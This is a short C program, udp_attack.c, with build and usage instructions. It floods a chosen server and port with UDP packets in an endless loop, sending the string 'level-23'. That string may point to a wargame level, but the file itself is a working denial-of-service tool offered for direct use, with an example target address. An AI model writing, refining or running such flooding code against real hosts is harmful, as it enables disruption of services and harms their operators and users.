/**
 * @file udp_attack.c
 * @brief compilation : gcc udp_attack.c -o udp_attack
 * usage : ./udp_attack server port
 * example : ./udp_attack 80.70.60.50 80
 */

#include <stdio.h>
#include <sys/param.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>
#include <stdarg.h>
#include <string.h>
#include <stdlib.h>

#define UDP_STRING "level-23"
#define UDP_SIZE 8
#define TRUE 1
#define ERROR_CODE -1

/// \brief function that create a connection with server over UDP
/// and return connected socket id
/// @param server - server name
/// @param port - server port number
/// @return connected socket id
int connection( const char *server, const int port );

/// \brief function that show usage
/// @return -
void usage( void );

/// \brief main function
int main( int argc, char **argv ) {
   int sock;
   long pck_ctr = 0;
   
   if( argc != 3 ) {
     usage();
     return ERROR_CODE;
   }
   
   if( ERROR_CODE == ( sock = connection( argv[ 1 ], atoi( argv[ 2 ] ) ) ) )
     return ERROR_CODE;

   while( TRUE ) {
     if( -1 == send( sock, UDP_STRING, UDP_SIZE, 0 ) )
       perror( "send" );
     else
       printf( "%ld packet is sent\r", pck_ctr++ );
   }
   
   return 0;
}

// connection function
int connection( const char *server, const int port ) {
   struct sockaddr_in addr;
   struct hostent *host;
   int sock;

   // get host address of server
   if( NULL == ( host = gethostbyname( server ) ) ) {
     perror( "connection" );
     return ERROR_CODE;
   }

   memset( &addr, '\0', sizeof( addr ) );
   memmove( &addr.sin_addr, host->h_addr, host->h_length );

   addr.sin_family = host->h_addrtype;
   addr.sin_port = htons( port );

   // create a datagram socket
   if( -1 == ( sock = socket( AF_INET, SOCK_DGRAM, 0 ) ) ) {
     perror( "connection" ); 
     return ERROR_CODE;
   }

   // connect to server
   if( -1 == connect( sock, ( struct sockaddr * ) &addr, sizeof( addr ) ) ) {
     perror( "connection" );
     return ERROR_CODE;
   }     

   return sock;
}

void usage( void ) {
  printf( "usage: ./udp_attack server port\n" );
  return;
}
